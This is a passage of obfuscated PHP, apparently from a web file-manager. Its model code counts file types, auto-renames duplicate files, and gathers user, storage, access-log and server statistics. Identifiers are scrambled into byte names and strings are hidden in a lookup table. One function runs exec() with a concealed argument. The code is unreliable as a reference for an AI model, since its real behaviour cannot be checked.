allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($f˜ÖØ‚Ù‡—) { return $this->fileTypeProfile($f˜ÖØ‚Ù‡—, SourceModel::TYPE_USER); } public function groupFileTypeProfile($b…†«˜¤áà) { return $this->fileTypeProfile($b…†«˜¤áà, SourceModel::TYPE_GROUP); } private function fileTypeProfile($a²›Š±Àí†, $fĞÃ‹š‡³™) { goto AŠÕŒÚ­¤; AŠÕŒÚ­¤: $Aß„éğÎ‘³ =& $_SERVER[ÍÓÖ€°å]; $Aè„‚ è½ç = array($Aß„éğÎ‘³[377] => 0); if ($a²›Š±Àí† != !1) { $Aè„‚ è½ç[$Aß„éğÎ‘³[386]] = $a²›Š±Àí†; $Aè„‚ è½ç[$Aß„éğÎ‘³[384]] = $fĞÃ‹š‡³™; } goto eÁ°ŒÆ÷´®; eÁ°ŒÆ÷´®: $B—®šÅ¨ù— = array(); $B—®šÅ¨ù—[$Aß„éğÎ‘³[1751]] = array($Aß„éğÎ‘³[1752] => LNG($Aß„éğÎ‘³[1751]), $Aß„éğÎ‘³[1753] => $this->where($Aè„‚ è½ç)->count(), $Aß„éğÎ‘³[382] => $this->where($Aè„‚ è½ç)->sum($Aß„éğÎ‘³[78])); $Eº÷ã’–× = KodIO::fileTypeList(); goto F‰è£ĞÌ¥; F‰è£ĞÌ¥: foreach ($Eº÷ã’–× as $B£êòšê£º => $CìØœ¸‰³ª) { $Aè„‚ è½ç[$Aß„éğÎ‘³[380]] = $this->fileTypeWhere($B£êòšê£º); $B—®šÅ¨ù—[$B£êòšê£º] = array($Aß„éğÎ‘³[1752] => $CìØœ¸‰³ª[$Aß„éğÎ‘³[28]], $Aß„éğÎ‘³[1753] => $this->where($Aè„‚ è½ç)->count(), $Aß„éğÎ‘³[382] => $this->where($Aè„‚ è½ç)->sum($Aß„éğÎ‘³[78])); } return $B—®šÅ¨ù—; goto d„æŒõº˜”; d„æŒõº˜”: } public function fileNameExist($C±¬‘»¤’â, $aª†–‰º¶) { $AÁ‰Œå®Á =& $_SERVER[ÍÓÖ€°å]; $B½¬Ñõ­Ç¶ = $this->childList($C±¬‘»¤’â); foreach ($B½¬Ñõ­Ç¶ as $E×ğ­åå) { if (strtolower($E×ğ­åå[$AÁ‰Œå®Á[28]]) == strtolower($aª†–‰º¶)) { return $E×ğ­åå[$AÁ‰Œå®Á[365]]; } } return !1; } public function childList($e‡¡­ŒªŠ) { $A¯Õğãèİ¼ =& $_SERVER[ÍÓÖ€°å]; $F“Ú‹Û©áÃ = array($A¯Õğãèİ¼[375] => intval($e‡¡­ŒªŠ), $A¯Õğãèİ¼[401] => 0); $b¸‰…³â¼ = $this->cacheMemory()->where($F“Ú‹Û©áÃ)->select(); $b¸‰…³â¼ = $b¸‰…³â¼ ? $b¸‰…³â¼ : array(); foreach ($b¸‰…³â¼ as $a»…îä‹À˜) { $c¶’¿ˆ…ó = $A¯Õğãèİ¼[1745] . $a»…îä‹À˜[$A¯Õğãèİ¼[365]]; self::$cacheSourceInfo[$c¶’¿ˆ…ó] = $a»…îä‹À˜; } return $b¸‰…³â¼; } public function fileNameAuto($F¤¯ÄƒÍˆô, $CÆ…ğà“„¬, $AšŒáïî±ø = REPEAT_RENAME, $fÂÛÌÑ«Æ = false) { $bóøã‡ó¹õ =& $_SERVER[ÍÓÖ€°å]; $E‘ë†íìÏ´ = $this->childList($F¤¯ÄƒÍˆô); $CİƒßŸÍĞ = array_to_keyvalue($E‘ë†íìÏ´, $bóøã‡ó¹õ[33], $bóøã‡ó¹õ[28]); return $this->fileNameAutoGet($CİƒßŸÍĞ, $CÆ…ğà“„¬, $AšŒáïî±ø, $fÂÛÌÑ«Æ); } public function fileNameAutoGet($fŒÔãÇß‚, $c¥ ·Á­–á, $bÂæâİèÔ¹, $Fµ•«ò®Û) { $dñÑ×ÜËÈ =& $_SERVER[ÍÓÖ€°å]; if ($bÂæâİèÔ¹ == REPEAT_REPLACE || !$fŒÔãÇß‚ || !in_array_not_case($c¥ ·Á­–á, $fŒÔãÇß‚) || $Fµ•«ò®Û && $bÂæâİèÔ¹ != REPEAT_RENAME_FOLDER) { return $c¥ ·Á­–á; } if ($bÂæâİèÔ¹ == REPEAT_SKIP) { return !1; } $aŠÓ»ë·‰ = $dñÑ×ÜËÈ[90] . get_path_ext($c¥ ·Á­–á); $aŠÓ»ë·‰ = $aŠÓ»ë·‰ == $dñÑ×ÜËÈ[90] || $Fµ•«ò®Û ? $dñÑ×ÜËÈ[33] : $aŠÓ»ë·‰; for ($EÕÕ’Çâ© = 1; $EÕÕ’Çâ© <= count($fŒÔãÇß‚) + 1; $EÕÕ’Çâ©++) { $AŸÂĞìßôí = substr($c¥ ·Á­–á, 0, strlen($c¥ ·Á­–á) - strlen($aŠÓ»ë·‰)); $BÌ¸‡Ç‹„¾ = $AŸÂĞìßôí . "\50{$EÕÕ’Çâ©}\51{$aŠÓ»ë·‰}"; if (!in_array_not_case($BÌ¸‡Ç‹„¾, $fŒÔãÇß‚)) { return $BÌ¸‡Ç‹„¾; } } } } goto fÔ¢„»íÚ; F¥ œÚ¹‡¡: class AnalysisModel extends ModelBaseLight { public function init($d­Ôº¯Öµ) { $aÛ„’ª‹¤œ =& $_SERVER[ÍÓÖ€°å]; $D–Èğ£’å = array($aÛ„’ª‹¤œ[407] => array($aÛ„’ª‹¤œ[29] => $aÛ„’ª‹¤œ[1442], $aÛ„’ª‹¤œ[253] => array($aÛ„’ª‹¤œ[205], $aÛ„’ª‹¤œ[448], $aÛ„’ª‹¤œ[1443], $aÛ„’ª‹¤œ[1444])), $aÛ„’ª‹¤œ[1445] => array($aÛ„’ª‹¤œ[29] => $aÛ„’ª‹¤œ[1446], $aÛ„’ª‹¤œ[253] => array($aÛ„’ª‹¤œ[205], $aÛ„’ª‹¤œ[446], $aÛ„’ª‹¤œ[1447], $aÛ„’ª‹¤œ[1448], $aÛ„’ª‹¤œ[1449]))); if (!isset($D–Èğ£’å[$d­Ôº¯Öµ])) { return !1; } $this->optionType = $D–Èğ£’å[$d­Ôº¯Öµ][$aÛ„’ª‹¤œ[29]]; $this->field = $D–Èğ£’å[$d­Ôº¯Öµ][$aÛ„’ª‹¤œ[253]]; return !0; } public function listData($Bß«»¦¿ê = false, $fÙŒ• Şƒó = "\x6d\157\144\x69\146\x79\x54\151\155\145", $dò¼ºÏè­ó = false) { return parent::listData($Bß«»¦¿ê, $fÙŒ• Şƒó, $dò¼ºÏè­ó); } public function trendList($C°Ôœ¯ÊÇ´) { goto A£öìØÔ…·; A£öìØÔ…·: $BÎ²†²Âàô =& $_SERVER[ÍÓÖ€°å]; $CÍ¦óÉçÈà = $this->listData(); if ($CÍ¦óÉçÈà) { $Eİ¯—è…„ = end($CÍ¦óÉçÈà); $C§§ší = date($BÎ²†²Âàô[1450], strtotime($BÎ²†²Âàô[1451])); if ($Eİ¯—è…„[$BÎ²†²Âàô[205]] == $C§§ší) { return $CÍ¦óÉçÈà; } $F¯³³ŒÛô = strtotime($Eİ¯—è…„[$BÎ²†²Âàô[205]]); } goto f…Áª·‚é; f…Áª·‚é: if (!isset($F¯³³ŒÛô)) { $döù´È = $C°Ôœ¯ÊÇ´ == $BÎ²†²Âàô[407] ? $BÎ²†²Âàô[1452] : $BÎ²†²Âàô[512]; $F¯³³ŒÛô = Model($döù´È)->min($BÎ²†²Âàô[175]); } $dÇØ˜º£Œ = $BÎ²†²Âàô[1453] . ucfirst($C°Ôœ¯ÊÇ´); $c¯†‚‘åë¨ = $this->dateList($F¯³³ŒÛô); goto aÁÈÛƒùÁ«; aÁÈÛƒùÁ«: foreach ($c¯†‚‘åë¨ as $C§§ší) { $this->{$dÇØ˜º£Œ}($C§§ší); } return $this->listData(); goto dÉ›èƒ•íñ; dÉ›èƒ•íñ: } private function dateList($cÕß„ËÕŞ­) { $cƒ„‰åè™ =& $_SERVER[ÍÓÖ€°å]; $eŒÉ‰óª‚ = $cÕß„ËÕŞ­; $B²ëÂİÎù¤ = strtotime($cƒ„‰åè™[1451]); $C®ç«©Ö†– = array(); while ($eŒÉ‰óª‚ <= $B²ëÂİÎù¤) { $C®ç«©Ö†–[] = date($cƒ„‰åè™[1450], $eŒÉ‰óª‚); $eŒÉ‰óª‚ = strtotime($cƒ„‰åè™[1454], $eŒÉ‰óª‚); } return $C®ç«©Ö†–; } public function _recordUser($C‚¸µ– ©Û = '') { goto A©à„âñ”; cÁÆ×óª¿°: $C›Ÿ¬ö¡‚ = array($a·ÁÕ…ò÷Ã[175] => array($a·ÁÕ…ò÷Ã[682], $cç’ä£µÒ)); $fÖÇšİŠŸ = Model($a·ÁÕ…ò÷Ã[1452])->where($C›Ÿ¬ö¡‚)->count($a·ÁÕ…ò÷Ã[1062]); $C›Ÿ¬ö¡‚[$a·ÁÕ…ò÷Ã[175]] = array($a·ÁÕ…ò÷Ã[313], array($D¬èÜºå„, $cç’ä£µÒ)); goto fÍ…äÔ™; CÅ±ƒ„²Ç‰: $BÉªºÇÁ©„ = array($a·ÁÕ…ò÷Ã[205] => $C‚¸µ– ©Û, $a·ÁÕ…ò÷Ã[448] => (int) $fÖÇšİŠŸ, $a·ÁÕ…ò÷Ã[1443] => (int) $b­‡ï‰Å¿¥, $a·ÁÕ…ò÷Ã[1444] => (int) $aôæˆÉ„ÀÅ); return $this->insert($BÉªºÇÁ©„); goto d¬Æ­–¾; fÍ…äÔ™: $b­‡ï‰Å¿¥ = Model($a·ÁÕ…ò÷Ã[1452])->where($C›Ÿ¬ö¡‚)->count($a·ÁÕ…ò÷Ã[1062]); $C›Ÿ¬ö¡‚[$a·ÁÕ…ò÷Ã[29]] = $a·ÁÕ…ò÷Ã[1457]; $aôæˆÉ„ÀÅ = Model($a·ÁÕ…ò÷Ã[1458])->where($C›Ÿ¬ö¡‚)->count($a·ÁÕ…ò÷Ã[1459]); goto CÅ±ƒ„²Ç‰; A©à„âñ”: $a·ÁÕ…ò÷Ã =& $_SERVER[ÍÓÖ€°å]; $D¬èÜºå„ = strtotime(date($a·ÁÕ…ò÷Ã[1455], strtotime($C‚¸µ– ©Û))); $cç’ä£µÒ = strtotime(date($a·ÁÕ…ò÷Ã[1456], strtotime($C‚¸µ– ©Û))); goto cÁÆ×óª¿°; d¬Æ­–¾: } public function _recordStore($A­¥ĞåŒˆ­ = '') { goto a½š¯Ì¬©•; dÌêíÊ¶·: $fã±¶ß»±Û = Model($aÔÃÚáÙŒ[402])->where($A·¬ãÙ«Ñ)->sum($aÔÃÚáÙŒ[78]); $A·¬ãÙ«Ñ[$aÔÃÚáÙŒ[366]] = 0; $C¡Ï©îÊÑŠ = Model($aÔÃÚáÙŒ[512])->where($A·¬ãÙ«Ñ)->sum($aÔÃÚáÙŒ[78]); goto C¤»ÍÇó™î; C¤»ÍÇó™î: $A·¬ãÙ«Ñ[$aÔÃÚáÙŒ[384]] = 1; $Aˆ±ˆ½†Ê = Model($aÔÃÚáÙŒ[512])->where($A·¬ãÙ«Ñ)->sum($aÔÃÚáÙŒ[78]); $A·¬ãÙ«Ñ[$aÔÃÚáÙŒ[384]] = 2; goto BÄºÈ‘ï–Ø; BÄºÈ‘ï–Ø: $bŸ•ÍİÈ‰„ = Model($aÔÃÚáÙŒ[512])->where($A·¬ãÙ«Ñ)->sum($aÔÃÚáÙŒ[78]); $C¥¸™§¢’õ = array($aÔÃÚáÙŒ[205] => $A­¥ĞåŒˆ­, $aÔÃÚáÙŒ[446] => (int) $C¡Ï©îÊÑŠ, $aÔÃÚáÙŒ[1447] => (int) $fã±¶ß»±Û, $aÔÃÚáÙŒ[1448] => (int) $Aˆ±ˆ½†Ê, $aÔÃÚáÙŒ[1449] => (int) $bŸ•ÍİÈ‰„); return $this->insert($C¥¸™§¢’õ); goto a¨Ïßõç©ƒ; a½š¯Ì¬©•: $aÔÃÚáÙŒ =& $_SERVER[ÍÓÖ€°å]; $dìŸª‰ = strtotime(date($aÔÃÚáÙŒ[1456], strtotime($A­¥ĞåŒˆ­))); $A·¬ãÙ«Ñ = array($aÔÃÚáÙŒ[175] => array($aÔÃÚáÙŒ[682], $dìŸª‰)); goto dÌêíÊ¶·; a¨Ïßõç©ƒ: } public function trend($f³Â¥ä¾¤ñ, $bì”…¤¾õÄ) { goto fÇæ×¬Îùë; a¯Úêˆ’–Æ: if (empty($cáåÌ†…Øƒ)) { $aêìšƒè´ = date($A„È¨ñ‘[1450], strtotime($A„È¨ñ‘[1451])); $bµÀœÄÉÃë = array($A„È¨ñ‘[205] => $aêìšƒè´); foreach ($C„µ˜šõİØ[$f³Â¥ä¾¤ñ] as $AÀÑ“ïõ®Ş => $aÔ™’¦äã) { $bµÀœÄÉÃë[$AÀÑ“ïõ®Ş] = 0; } $cáåÌ†…Øƒ[] = $bµÀœÄÉÃë; } $EÙË•ê¸”µ = array(); foreach ($cáåÌ†…Øƒ as $aÔ™’¦äã) { if ($f³Â¥ä¾¤ñ == $A„È¨ñ‘[1445] && $aÔ™’¦äã[$A„È¨ñ‘[1447]] > $aÔ™’¦äã[$A„È¨ñ‘[446]]) { $aÔ™’¦äã[$A„È¨ñ‘[1447]] = $aÔ™’¦äã[$A„È¨ñ‘[446]]; } foreach ($C„µ˜šõİØ[$f³Â¥ä¾¤ñ] as $AÀÑ“ïõ®Ş => $bğ±‹òš½) { $c‹”„œ’‰ = array($A„È¨ñ‘[205] => $aÔ™’¦äã[$A„È¨ñ‘[205]], $A„È¨ñ‘[968] => $bğ±‹òš½); $c‹”„œ’‰[$e¥‘’£‘–¤[$f³Â¥ä¾¤ñ]] = isset($aÔ™’¦äã[$AÀÑ“ïõ®Ş]) ? $aÔ™’¦äã[$AÀÑ“ïõ®Ş] : 0; $EÙË•ê¸”µ[] = $c‹”„œ’‰; } } goto c±„¶…Ì÷ì; c±„¶…Ì÷ì: return $EÙË•ê¸”µ; goto F…¤îïää; fŒ×§İîºÏ: if ($cáåÌ†…Øƒ && $bì”…¤¾õÄ != $A„È¨ñ‘[1037]) { $EÙ“Í÷á„× = $cáåÌ†…Øƒ[0][$A„È¨ñ‘[205]]; $AÍøŸøŠ²ø = $this->validDate($bì”…¤¾õÄ, $EÙ“Í÷á„×); $Bˆ±¬»òÃ“ = array(); $aµ¿¹÷ååï = array_to_keyvalue($cáåÌ†…Øƒ, $A„È¨ñ‘[205]); foreach ($AÍøŸøŠ²ø as $aêìšƒè´) { if (isset($aµ¿¹÷ååï[$aêìšƒè´])) { $c‹”„œ’‰ = $aµ¿¹÷ååï[$aêìšƒè´]; } else { $c‹”„œ’‰ = end($cáåÌ†…Øƒ); $c‹”„œ’‰[$A„È¨ñ‘[205]] = $aêìšƒè´; if ($f³Â¥ä¾¤ñ == $A„È¨ñ‘[407]) { $c‹”„œ’‰[$A„È¨ñ‘[1443]] = $c‹”„œ’‰[$A„È¨ñ‘[1444]] = 0; } } $Bˆ±¬»òÃ“[] = $c‹”„œ’‰; } $cáåÌ†…Øƒ = $Bˆ±¬»òÃ“; } $C„µ˜šõİØ = array($A„È¨ñ‘[407] => array($A„È¨ñ‘[448] => LNG($A„È¨ñ‘[1460]), $A„È¨ñ‘[1443] => LNG($A„È¨ñ‘[1461]), $A„È¨ñ‘[1444] => LNG($A„È¨ñ‘[1462])), $A„È¨ñ‘[1445] => array($A„È¨ñ‘[446] => LNG($A„È¨ñ‘[1463]), $A„È¨ñ‘[1447] => LNG($A„È¨ñ‘[1464]), $A„È¨ñ‘[1448] => LNG($A„È¨ñ‘[1465]), $A„È¨ñ‘[1449] => LNG($A„È¨ñ‘[1466]))); $e¥‘’£‘–¤ = array($A„È¨ñ‘[407] => $A„È¨ñ‘[1467], $A„È¨ñ‘[1445] => $A„È¨ñ‘[78]); goto a¯Úêˆ’–Æ; fÇæ×¬Îùë: $A„È¨ñ‘ =& $_SERVER[ÍÓÖ€°å]; if (!$this->init($f³Â¥ä¾¤ñ)) { return !1; } $cáåÌ†…Øƒ = $this->trendList($f³Â¥ä¾¤ñ); goto fŒ×§İîºÏ; F…¤îïää: } public function validDate($DÔÀëòó’Š, $CÇ­¾†İÖ¸) { goto fğˆóãİÃé; fğˆóãİÃé: $d÷äğ÷ïî° =& $_SERVER[ÍÓÖ€°å]; $fÉ·ÑŠˆ = date($d÷äğ÷ïî°[1450], strtotime($d÷äğ÷ïî°[1451])); $eÓ±îê„µ• = array($fÉ·ÑŠˆ); goto b‚Ÿ¡ÃĞ¹; b‚Ÿ¡ÃĞ¹: switch ($DÔÀëòó’Š) { case $d÷äğ÷ïî°[1044]: $c¢‹À¥¡å = mktime(0, 0, 0, date($d÷äğ÷ïî°[1468]), date($d÷äğ÷ïî°[1469]) - date($d÷äğ÷ïî°[928]) + 7 - 7, date($d÷äğ÷ïî°[1470])); $a¥††ò°Æ¶ = 0; do { $B³Òá‰á¨ = date($d÷äğ÷ïî°[1450], $c¢‹À¥¡å - 3600 * 24 * 7 * $a¥††ò°Æ¶); $eÓ±îê„µ•[] = $B³Òá‰á¨; $a¥††ò°Æ¶++; } while ($CÇ­¾†İÖ¸ < $B³Òá‰á¨); break; case $d÷äğ÷ïî°[1042]: $a¥††ò°Æ¶ = 1; do { $a±†‹Ö¯î = date($d÷äğ÷ïî°[1471], strtotime("\55\40{$a¥††ò°Æ¶}\40\155\157\x6e\164\x68\163")); $eÓ±îê„µ•[] = $a±†‹Ö¯î; $a¥††ò°Æ¶++; } while ($CÇ­¾†İÖ¸ < $a±†‹Ö¯î); break; case $d÷äğ÷ïî°[1403]: $dßÆßæ®£‘ = (int) date($d÷äğ÷ïî°[1470], strtotime($CÇ­¾†İÖ¸)); $BŠŒÈ–Œ˜‰ = (int) date($d÷äğ÷ïî°[1470]); if ($dßÆßæ®£‘ >= $BŠŒÈ–Œ˜‰) { break; } for ($dßÆßæ®£‘; $dßÆßæ®£‘ < $BŠŒÈ–Œ˜‰; $dßÆßæ®£‘++) { $eÓ±îê„µ•[] = $dßÆßæ®£‘ . $d÷äğ÷ïî°[1472]; } break; default: break; } if ($CÇ­¾†İÖ¸ > end($eÓ±îê„µ•)) { array_pop($eÓ±îê„µ•); } sort($eÓ±îê„µ•); goto f´ƒ°§–¶Ü; f´ƒ°§–¶Ü: return $eÓ±îê„µ•; goto eİ„¥®ºÙæ; eİ„¥®ºÙæ: } public function listTable($FÑöÖŠ¨ÚÉ) { $B÷©ÜŸã„À = ucfirst($FÑöÖŠ¨ÚÉ); return Model($B÷©ÜŸã„À)->listData(); } public function option($fÁ¡”ê¸Õñ) { $fŸŞ‘¥ê›Û = $_SERVER[ÍÓÖ€°å][1473] . ucfirst($fÁ¡”ê¸Õñ); return $this->{$fŸŞ‘¥ê›Û}(); } private function optionUser() { goto d¯œ­íèõ´; d¯œ­íèõ´: $D·‘˜ÛÏÊã =& $_SERVER[ÍÓÖ€°å]; $bÚíÓ¡Ş¾Ò = Model($D·‘˜ÛÏÊã[1452])->count($D·‘˜ÛÏÊã[1062]); $F¦âˆ¢’…î = Model($D·‘˜ÛÏÊã[1452])->where($D·‘˜ÛÏÊã[1474])->count($D·‘˜ÛÏÊã[1062]); goto b Ë¬…íÆ·; b Ë¬…íÆ·: $E—’˜İ‹¯ = strtotime($D·‘˜ÛÏÊã[1475]); $CàöâÀÄÒÁ = array($D·‘˜ÛÏÊã[1476] => array($D·‘˜ÛÏÊã[683], $E—’˜İ‹¯)); $Fî¿¯£³ = (int) Model($D·‘˜ÛÏÊã[1452])->where($CàöâÀÄÒÁ)->count($D·‘˜ÛÏÊã[1062]); goto eµ™„ºÂ‘; eµ™„ºÂ‘: if (!$Fî¿¯£³) { $Fî¿¯£³ = 1; } $E—’˜İ‹¯ = strtotime(date($D·‘˜ÛÏÊã[1455])); $CàöâÀÄÒÁ = array($D·‘˜ÛÏÊã[1476] => array($D·‘˜ÛÏÊã[683], $E—’˜İ‹¯)); goto C‹¾Ş÷î; C‹¾Ş÷î: $f·ƒïº…”± = Model($D·‘˜ÛÏÊã[1452])->where($CàöâÀÄÒÁ)->count($D·‘˜ÛÏÊã[1062]); return array($D·‘˜ÛÏÊã[443] => (int) $bÚíÓ¡Ş¾Ò, $D·‘˜ÛÏÊã[1477] => (int) ($bÚíÓ¡Ş¾Ò - $F¦âˆ¢’…î), $D·‘˜ÛÏÊã[1478] => (int) $F¦âˆ¢’…î, $D·‘˜ÛÏÊã[1479] => (int) $f·ƒïº…”±, $D·‘˜ÛÏÊã[1480] => $Fî¿¯£³); goto C§è ö×ÂŒ; C§è ö×ÂŒ: } private function optionFile() { goto d«ÄÍ¹™ò…; E™Úá¤×‹: $E×Á¸„á„¤ = Model($eõÚÓæœ¢Ú[512])->where($AŸáï£½ğ½)->sum($eõÚÓæœ¢Ú[78]); $B…ˆ‘È¢óò = Model($eõÚÓæœ¢Ú[512])->where($AŸáï£½ğ½)->count($eõÚÓæœ¢Ú[365]); return array($eõÚÓæœ¢Ú[446] => $fª÷›˜–™ç, $eõÚÓæœ¢Ú[1447] => $DÆÄ®œŞ±÷, $eõÚÓæœ¢Ú[1481] => $fª÷›˜–™ç - $DÆÄ®œŞ±÷, $eõÚÓæœ¢Ú[1482] => (int) $E×Á¸„á„¤, $eõÚÓæœ¢Ú[448] => (int) $eƒ¯·¢°½¤, $eõÚÓæœ¢Ú[1483] => (int) $B…ˆ‘È¢óò); goto aßÀĞ·î¤; d«ÄÍ¹™ò…: $eõÚÓæœ¢Ú =& $_SERVER[ÍÓÖ€°å]; $CõÒ¶İÎİ = $this->sourceSize(); $fª÷›˜–™ç = $CõÒ¶İÎİ[$eõÚÓæœ¢Ú[78]]; goto A¾©—¹ø¸‹; A¾©—¹ø¸‹: $DÆÄ®œŞ±÷ = $CõÒ¶İÎİ[$eõÚÓæœ¢Ú[1447]]; $eƒ¯·¢°½¤ = Model($eõÚÓæœ¢Ú[512])->where(array($eõÚÓæœ¢Ú[366] => 0))->count($eõÚÓæœ¢Ú[365]); $AŸáï£½ğ½ = array($eõÚÓæœ¢Ú[366] => 0, $eõÚÓæœ¢Ú[175] => array($eõÚÓæœ¢Ú[683], strtotime(date($eõÚÓæœ¢Ú[1455])))); goto E™Úá¤×‹; aßÀĞ·î¤: } private function optionAccess() { $bçº´ºåù½ =& $_SERVER[ÍÓÖ€°å]; return array($bçº´ºåù½[443] => $this->typeLogCnt(), $bçº´ºåù½[126] => $this->typeLogCnt($bçº´ºåù½[126]), $bçº´ºåù½[1484] => $this->typeLogCnt($bçº´ºåù½[1484]), $bçº´ºåù½[359] => $this->typeLogCnt($bçº´ºåù½[359]), $bçº´ºåù½[1485] => $this->typeLogCnt($bçº´ºåù½[1485]), $bçº´ºåù½[407] => $this->typeLogCnt($bçº´ºåù½[33], $bçº´ºåù½[1459])); } private function typeLogCnt($a›ïÍ—ÇŸ• = '', $F‡´ã£‚©É = "\151\144") { goto C„Ü–«Áä–; C„Ü–«Áä–: $B ö×øßâ =& $_SERVER[ÍÓÖ€°å]; $e›âŸ¤ö³È = array($B ö×øßâ[126] => array($B ö×øßâ[1486], $B ö×øßâ[1487]), $B ö×øßâ[1484] => array($B ö×øßâ[1488]), $B ö×øßâ[359] => array($B ö×øßâ[1489], $B ö×øßâ[1490]), $B ö×øßâ[1485] => array($B ö×øßâ[1491], $B ö×øßâ[1492]), $B ö×øßâ[1493] => array($B ö×øßâ[1494], $B ö×øßâ[1495], $B ö×øßâ[1496])); $CÇ£©ÓÆ„ó = strtotime(date($B ö×øßâ[1455])); goto B¶ïêî‹¼; B¶ïêî‹¼: $AŠŠ¬Êó©¨ = array($B ö×øßâ[175] => array($B ö×øßâ[683], $CÇ£©ÓÆ„ó)); if ($a›ïÍ—ÇŸ•) { $AŠŠ¬Êó©¨[$B ö×øßâ[29]] = array($B ö×øßâ[7], $e›âŸ¤ö³È[$a›ïÍ—ÇŸ•]); } $CÏìƒõœ²¼ = Model($B ö×øßâ[1458])->where($AŠŠ¬Êó©¨)->count($F‡´ã£‚©É); goto dµ®¹£›¶‰; dµ®¹£›¶‰: return (int) $CÏìƒõœ²¼; goto dùŒ²È‹öµ; dùŒ²È‹öµ: } private function optionServer() { goto f…³Ù½øé; EÒİÑñœ£•: $c¿¢‹à®é = array($DÃ—ì…ÉÅ[471] => $a¯Å¹Ş£ Î[$DÃ—ì…ÉÅ[357]]); $f™„Æ’ß´ = Model($DÃ—ì…ÉÅ[402])->where($c¿¢‹à®é)->sum($DÃ—ì…ÉÅ[78]); $bääÈî†·£ = explode($DÃ—ì…ÉÅ[50], $_SERVER[$DÃ—ì…ÉÅ[129]]); goto d’âËÒø; fªîß¦Ä›Ø: return array($DÃ—ì…ÉÅ[1499] => $AÆ¶æÇÁ ? $AÆ¶æÇÁ[$DÃ—ì…ÉÅ[1500]] : 0, $DÃ—ì…ÉÅ[1501] => $AÆ¶æÇÁ ? $AÆ¶æÇÁ[$DÃ—ì…ÉÅ[1502]] : 0, $DÃ—ì…ÉÅ[1503] => (int) $a¯Å¹Ş£ Î[$DÃ—ì…ÉÅ[1500]] * 1024 * 1024 * 1024, $DÃ—ì…ÉÅ[1504] => (int) $f™„Æ’ß´, $DÃ—ì…ÉÅ[1505] => ucfirst($A’‘ê‡¼òŒ), $DÃ—ì…ÉÅ[1506] => $DÃ—ì…ÉÅ[1507] . PHP_VERSION, $DÃ—ì…ÉÅ[1508] => phpBuild64() ? 64 : 32, $DÃ—ì…ÉÅ[442] => str_replace($DÃ—ì…ÉÅ[1509], $DÃ—ì…ÉÅ[659], $C„Ñë¡îÛ), $DÃ—ì…ÉÅ[329] => ucfirst($BóÎùÎÄë–), $DÃ—ì…ÉÅ[28] => $_SERVER[$DÃ—ì…ÉÅ[1510]]); goto cÂÂÜ‡ŒÜ¬; d’âËÒø: $A’‘ê‡¼òŒ = $bääÈî†·£[0]; $eÛ’ÊñÂ³¢ = $GLOBALS[$DÃ—ì…ÉÅ[6]][$DÃ—ì…ÉÅ[17]]; $C„Ñë¡îÛ = $eÛ’ÊñÂ³¢[$DÃ—ì…ÉÅ[481]]; goto CÍ”í‰­‹; f…³Ù½øé: $DÃ—ì…ÉÅ =& $_SERVER[ÍÓÖ€°å]; $AÆ¶æÇÁ = $this->diskDriver(); $a¯Å¹Ş£ Î = KodIO::defaultDriver(); goto EÒİÑñœ£•; CÍ”í‰­‹: if ($C„Ñë¡îÛ == $DÃ—ì…ÉÅ[482]) { $dÉîÕÎâ = explode($DÃ—ì…ÉÅ[483], $eÛ’ÊñÂ³¢[$DÃ—ì…ÉÅ[484]]); $C„Ñë¡îÛ = $dÉîÕÎâ[0]; } if ($C„Ñë¡îÛ == $DÃ—ì…ÉÅ[579] || $C„Ñë¡îÛ == $DÃ—ì…ÉÅ[464]) { $fèî¦Ä–‚¯ = Model()->db()->query($DÃ—ì…ÉÅ[1497]); $céÅ´Ää·Ó = $fèî¦Ä–‚¯[0] && isset($fèî¦Ä–‚¯[0][$DÃ—ì…ÉÅ[967]]) ? $fèî¦Ä–‚¯[0][$DÃ—ì…ÉÅ[967]] : 0; $C„Ñë¡îÛ = $DÃ—ì…ÉÅ[1498] . ($céÅ´Ää·Ó ? $DÃ—ì…ÉÅ[8] . $céÅ´Ää·Ó : $DÃ—ì…ÉÅ[33]); } $BóÎùÎÄë– = $GLOBALS[$DÃ—ì…ÉÅ[6]][$DÃ—ì…ÉÅ[329]][$DÃ—ì…ÉÅ[513]]; goto fªîß¦Ä›Ø; cÂÂÜ‡ŒÜ¬: } private function diskDriver() { goto b…ƒĞš´ ; EÎ’£³ãŸ‰: $c¯ÖÇ˜† ’ = $C„øå’¶ù - @disk_free_space($bŠÕğÇŒÃ); return array($c¿İÎ˜–‘[1500] => $C„øå’¶ù, $c¿İÎ˜–‘[1502] => $c¯ÖÇ˜† ’); goto Bä ¼‰¹ßŒ; b…ƒĞš´ : $c¿İÎ˜–‘ =& $_SERVER[ÍÓÖ€°å]; $bŠÕğÇŒÃ = $c¿İÎ˜–‘[8]; $D¯…±ƒôã = $GLOBALS[$c¿İÎ˜–‘[6]][$c¿İÎ˜–‘[1511]] == $c¿İÎ˜–‘[1512]; goto C©Ó«êİÎ’; C©Ó«êİÎ’: if ($D¯…±ƒôã) { $bŠÕğÇŒÃ = $c¿İÎ˜–‘[1513]; if (function_exists($c¿İÎ˜–‘[1514])) { exec($c¿İÎ˜–‘[1515], $f‡ùôÔã¨º); $bŠÕğÇŒÃ = $f‡ùôÔã¨º[1] . $c¿İÎ˜–‘[8]; } } if (!file_exists($bŠÕğÇŒÃ)) { return; } $C„øå’¶ù = @disk_total_space($bŠÕğÇŒÃ); goto EÎ’£³ãŸ‰; Bä ¼‰¹ßŒ: } public function fileChart($E’ø·‹ƒ¿) { goto BÑ¼¿»ƒ»­; BÑ¼¿»ƒ»­: $C»™Ü«ÈäÜ =& $_SERVER[ÍÓÖ€°å]; if (isset($E’ø·‹ƒ¿[$C»™Ü«ÈäÜ[1062]])) { return Model($C»™Ü«ÈäÜ[512])->userFileTypeProfile($E’ø·‹ƒ¿[$C»™Ü«ÈäÜ[1062]]); } if (isset($E’ø·‹ƒ¿[$C»™Ü«ÈäÜ[1516]])) { return Model($C»™Ü«ÈäÜ[512])->groupFileTypeProfile($E’ø·‹ƒ¿[$C»™Ü«ÈäÜ[1516]]); } goto Fê¶‘•®¶•; b¬œ²à®ªÕ: $Bù ­Œ¼ï¥[$C»™Ü«ÈäÜ[384]] = 2; $Cè±ØÇ¦ = Model($C»™Ü«ÈäÜ[512])->where($Bù ­Œ¼ï¥)->sum($C»™Ü«ÈäÜ[78]); return array($C»™Ü«ÈäÜ[446] => $d¹ùã´Ù¸ß[$C»™Ü«ÈäÜ[78]], $C»™Ü«ÈäÜ[1447] => $d¹ùã´Ù¸ß[$C»™Ü«ÈäÜ[1447]], 